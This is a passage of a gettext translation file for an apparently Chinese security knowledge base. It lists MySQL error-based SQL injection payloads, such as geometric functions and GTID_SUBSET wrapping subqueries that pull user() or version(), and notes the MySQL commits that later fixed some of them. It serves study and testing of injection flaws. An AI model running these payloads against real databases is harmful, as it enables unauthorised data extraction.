msgstr "``ST_LatFromGeoHash((select * from(select * from(select user())a)b))``"

#: ../../source/vuln/sql/fuzz.rst:47
msgid "``GTID_SUBSET(version(), 1)``"
msgstr "``GTID_SUBSET(version(), 1)``"

#: ../../source/vuln/sql/fuzz.rst:50
msgid "基于geometric的报错注入"
msgstr "Geometric-Based Error Injection"

#: ../../source/vuln/sql/fuzz.rst:51
msgid "``GeometryCollection((select * from (select * from(select user())a)b))``"
msgstr "``GeometryCollection((select * from (select * from(select user())a)b))``"

#: ../../source/vuln/sql/fuzz.rst:52
msgid "``polygon((select * from(select * from(select user())a)b))``"
msgstr "``polygon((select * from(select * from(select user())a)b))``"

#: ../../source/vuln/sql/fuzz.rst:53
msgid "``multipoint((select * from(select * from(select user())a)b))``"
msgstr "``multipoint((select * from(select * from(select user())a)b))``"

#: ../../source/vuln/sql/fuzz.rst:54
msgid "``multilinestring((select * from(select * from(select user())a)b))``"
msgstr "``multilinestring((select * from(select * from(select user())a)b))``"

#: ../../source/vuln/sql/fuzz.rst:55
msgid "``LINESTRING((select * from(select * from(select user())a)b))``"
msgstr "``LINESTRING((select * from(select * from(select user())a)b))``"

#: ../../source/vuln/sql/fuzz.rst:56
msgid "``multipolygon((select * from(select * from(select user())a)b))``"
msgstr "``multipolygon((select * from(select * from(select user())a)b))``"

#: ../../source/vuln/sql/fuzz.rst:58
msgid ""
"其中需要注意的是，基于exp函数的报错注入在MySQL 5.5.49后的版本已经不再生效，具体可以参考这个 `commit 95825f "
"<https://github.com/mysql/mysql-"
"server/commit/95825fa28a7e84a2f5dbdef5241078f7055c5b04>`_ 。"
msgstr ""
"Note that error-based injection using the exp function no longer works in "
"MySQL versions after 5.5.49. For details, see `commit 95825f "
"<https://github.com/mysql/mysql-"
"server/commit/95825fa28a7e84a2f5dbdef5241078f7055c5b04>`_."

#: ../../source/vuln/sql/fuzz.rst:60
msgid ""
"而以上列表中基于geometric的报错注入在这个 `commit 5caea4 <https://github.com/mysql/mysql-"
"server/commit/5caea4a995130cd7c82574acc591ff7c46d9d978>`_ "
"中被修复，在5.5.x较后的版本中同样不再生效。"
msgstr ""
"The geometric-based error injection techniques listed above were fixed in "
"`commit 5caea4 <https://github.com/mysql/mysql-"
"server/commit/5caea4a995130cd7c82574acc591ff7c46d9d978>`_ and likewise no "
"longer work in later 5.5.x versions."

